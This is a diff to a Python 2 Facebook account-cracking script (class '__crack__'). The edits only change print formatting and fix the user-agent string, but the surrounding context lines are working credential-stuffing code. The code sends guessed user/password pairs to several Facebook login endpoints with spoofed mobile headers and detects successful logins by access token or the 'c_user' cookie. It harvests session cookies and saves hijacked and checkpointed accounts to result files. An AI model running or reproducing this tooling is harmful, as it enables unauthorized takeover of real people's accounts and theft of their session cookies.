@@ -655,7 +655,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-            user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
+            user_agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 
                'x-fb-connection-quality': 'EXCELLENT', 
@@ -667,7 +667,7 @@ class __crack__:
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params , headers=headers_)
             if re.search('(EAAA)\\w+', response.text):
-                print '\r%sID: %s \nPW FB: %s      %s' % (H,user,pw,N)
+                print '\r%sID: %s | %s      %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -681,7 +681,7 @@ class __crack__:
                 except (KeyError, IOError):
                     tt = ' '
                 except: pass
-                print '\r%sID: %s \nPW FB: %s \n%s     %s' % (K,user,pw,tt,N)
+                print '\r%sID: %s | %s %s     %s' % (K,user,pw,tt,N)
                 wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -710,7 +710,7 @@ class __crack__:
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
             if 'mbasic_logout_button' in xo or 'save-device' in xo:
-                print '\r%sID: %s \nPW FB: %s      %s' % (H,user,pw,N)
+                print '\r%sID: %s | %s      %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -724,7 +724,7 @@ class __crack__:
                 except (KeyError, IOError):
                     tt = ' '
                 except: pass
-                print '\r%sID: %s \nPW FB: %s \n%s     %s' % (K,user,pw,tt,N)
+                print '\r%sID: %s | %s %s     %s' % (K,user,pw,tt,N)
                 wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -774,7 +774,7 @@ class __crack__:
             b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
             if 'c_user' in ses.cookies.get_dict().keys():
                 kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %sID: %s PW FB: %s %s     %s' % (H,user,pw,kuki,N)
+                print '\r  %sID: %s | %s %s     %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s|%s|%s' % (user, pw, kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -788,7 +788,7 @@ class __crack__:
                 except (KeyError, IOError):
                     tt = ' '
                 except: pass
-                print '\r  %sID: %s PW FB: %s %s     %s' % (K,user,pw,tt,N)
+                print '\r  %sID: %s | %s %s     %s' % (K,user,pw,tt,N)
                 wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
